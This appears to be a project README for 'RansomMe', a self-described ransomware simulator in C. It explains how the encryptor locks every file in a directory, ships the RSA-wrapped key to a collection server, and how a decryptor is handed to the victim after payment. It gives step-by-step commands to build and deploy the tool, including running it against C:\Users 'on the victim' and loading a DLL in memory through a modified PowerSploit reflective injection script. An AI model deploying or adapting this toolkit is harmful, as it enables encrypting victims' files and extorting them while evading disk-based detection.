# RansomMe

A simple ransomware simulator using the WinCrypt API in C. The full project is made of several parts:

- **RansomMe.exe** -- It gets as input parameters a target directory, an extension and a server name. It will encrypt all files in the target directory using AES256, appending the extension to all the encrypted files and will encrypt (RSA2048 public key) and send the symmetric key to the server.
- **Server.py** -- It will receive the encrypted key, parse it and decrypt it using the RSA2048 private key. The code includes a parsing function to convert the WinCrypt-generated private key into a readable format for the python library.
- **Decryptor.exe** -- This is the decryptor. It is supposed to be realeased, together with the decrypted symmetric key, to the victim when they hypothetically make the ransom payment. It accepts a target directory, extension and a path to the key as parameters.
- **RansomMeDLL.dll** -- A DLL version that can be used with Invoke-ReflectivePEInjection.
- **Invoke-ReflectivePEInjection.ps1** -- I modified the script from PowerSploit to include a parameter when calling VoidFunc (injecting in the current process only).
- **KeyGenerator.exe** -- An auxiliary C application to generate an RSA2048 public/private key pair compatible with the WinCrypt API.

# Set me up

Begin generating a public/private key pair:
```
.\KeyGenerator.exe
```
Then copy the private key to the server folder (the name must be `private.pem`) and run the server. The server can be run on Linux too:
```
mv .\private_key.pem ..\Server\private.pem
```
Install the python requirements like the cryptography:
```
pip install cryptography
```
Run the server:
```
.\server.py
```
Copy the public key into the `crypto.c` file and compile the code:
```
// The public key is hardcoded in PEM format, this function decodes it and import it
BOOL LoadPublicKey(HCRYPTPROV* hProv, HCRYPTKEY* hKey) {
    // Public key in PEM format
/* COPY YOUR PUBLIC KEY HERE */
    static const char* b64_pubKey = "BgIAAACkAABSU0ExAAgAAAEAAQCxwjeWWlr4rXPoNPpQ+GbS2dT8HNM1qpGKo6FOsmLfEf0Lzb8oQdaqgII+ZG+ZjGQAK8pe0M4"
        "wb/dSlS1ZRphehyw/JnE3IkJO197OZMzYzi98WnZgSZEGs7jAY0mPhnrFytOatuL4BcxmtGd6MCZMscaMYwbwkNSOeDhbGx0z5p"
        "LeIAi0Z3zGD9KntVa4pL8FG4f/4KH7I7GPZKpAI3mfzZF08C3DupbO4xTS3witFVXFFclnx7kJDdrLoKBJBj+rVgrtr55kSrcsF"
        "pntYWjG9GAyelhSrkQhJozdsOSJ7dNpDo8KBcSkT25qz8P06Vy4pwWQWu/ID64Y6EgnetvE";

    // Decode Base64
    BYTE* decodedData = NULL;
    DWORD decodedDataLen = 0;
```
Now execute the RansomMe.exe on the victim (.enc and 127.0.0.1 are the default values for extension and server):
```
.\RansomMe.exe C:\Users .enc 127.0.0.1
```
You can run the DLL in memory like this (it will use .enc and 127.0.0.1 as default extension and server, you can change this in the source code):
```
$PEBytes = [IO.File]::ReadAllBytes('C:\Temp\RansomMeDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType Param -ExeArgs "C:\Users"
```
If you want to decrypt, just copy the Decryptor.exe and the key.bin (from the server folder) into the victim and run:
```
.\Decryptor.exe C:\Users .enc .\key.bin
```
Make sure you do not modify any file that is encrypted and use the same extension when decrypting. The decryptor will only attempt to decrypt files with that extension.
